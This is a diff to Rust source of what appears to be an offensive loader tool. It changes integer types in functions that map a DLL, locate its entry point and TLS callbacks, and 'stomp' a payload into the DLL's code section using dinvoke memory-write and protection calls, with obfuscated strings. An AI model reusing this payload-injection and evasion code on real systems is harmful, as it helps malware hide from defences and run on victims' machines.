@@ -562,18 +562,18 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
         let entry_point;
         if mapped_dll_metadata.is_32_bit 
         {
-           entry_point = mapped_dll + mapped_dll_metadata.opt_header_32.AddressOfEntryPoint as isize;
+           entry_point = mapped_dll + mapped_dll_metadata.opt_header_32.AddressOfEntryPoint as usize;
         }
         else 
         {
-           entry_point = mapped_dll + mapped_dll_metadata.opt_header_64.address_of_entry_point as isize;
+           entry_point = mapped_dll + mapped_dll_metadata.opt_header_64.address_of_entry_point as usize;
   
         }
 
         let mut tls_callback_vas: Vec<usize> = vec![]; 
         if mapped_dll_metadata.opt_header_64.number_of_rva_and_sizes >= 10
         {
-            let address: *mut u8 = (mapped_dll as usize + mapped_dll_metadata.opt_header_64.datas_directory[9].VirtualAddress as usize) as *mut u8;
+            let address: *mut u8 = (mapped_dll  + mapped_dll_metadata.opt_header_64.datas_directory[9].VirtualAddress as usize) as *mut u8;
             let address_of_tls_callback = address.add(24) as *mut usize;
             let mut address_of_tls_callback_array: *mut usize = std::mem::transmute(*address_of_tls_callback);
             
@@ -688,7 +688,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
 ///     }
 /// }
 /// ```
-pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> Result<(PeMetadata,isize), String>
+pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> Result<(PeMetadata,usize), String>
 {
     unsafe
     {
@@ -721,7 +721,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
 
                 if ret != 0
                 {
-                    let _ = dinvoke::free_library(loaded_dll);
+                    let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
 
@@ -733,7 +733,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 let ret = dinvoke::nt_write_virtual_memory(handle, text_address, buffer, nsize, bytes_written);
                 if ret != 0
                 {
-                    let _ = dinvoke::free_library(loaded_dll);
+                    let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
 
@@ -750,7 +750,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
                 if ret != 0
                 {
-                    let _ = dinvoke::free_library(loaded_dll);
+                    let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
 
